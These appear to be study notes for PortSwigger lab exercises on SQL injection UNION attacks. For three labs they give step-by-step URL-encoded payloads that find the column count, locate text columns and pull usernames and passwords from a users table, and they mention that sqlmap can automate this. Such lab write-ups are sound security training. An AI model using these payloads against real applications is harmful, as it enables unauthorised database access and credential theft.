# SQL Injection Part 2: Portswigger Labs
### [Lab 4: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

**To solve: Find column containing text and print gDi73c**

**STEP 1:**
Find number of colums
```html
'+UNION+SELECT+NULL,NULL,NULL--
```

**STEP 2:**
Find columns that contains text
```html
'+UNION+SELECT+NULL,'abcd',NULL--
```

**STEP 3:**
Print the text 'gDi73c'
```html
'+UNION+SELECT+null,+'gDi73c',+null--
```

### [Lab 5: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

**To solve: Login as administrator**

**STEP 1:**
Find number of column returned
```html
'+UNION+SELECT+NULL,NULL--
```

**STEP 2:**
Find column that contains text
```html
'+UNION+SELECT+abcd,'abcd'--
```
***Both column contains text***

**STEP 3:**
Return username and password from users table
```html
+UNION+SELECT+username,+password+FROM+users--
```

### [Lab 6: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
**To solve: Login as administrator**

**STEP 1:**
Find number of column returned
```html
'+UNION+SELECT+NULL,NULL--
```

**STEP 2:**
Find column that contains text
```html
'+UNION+SELECT+null,'abcd'--
```

**STEP 3:**
Return username and password in single column
```html
'+UNION+SELECT+null,+username||password+FROM+users--
```

ALL THE ABOVE CAN BE ALSO DONE BY SQLMAP


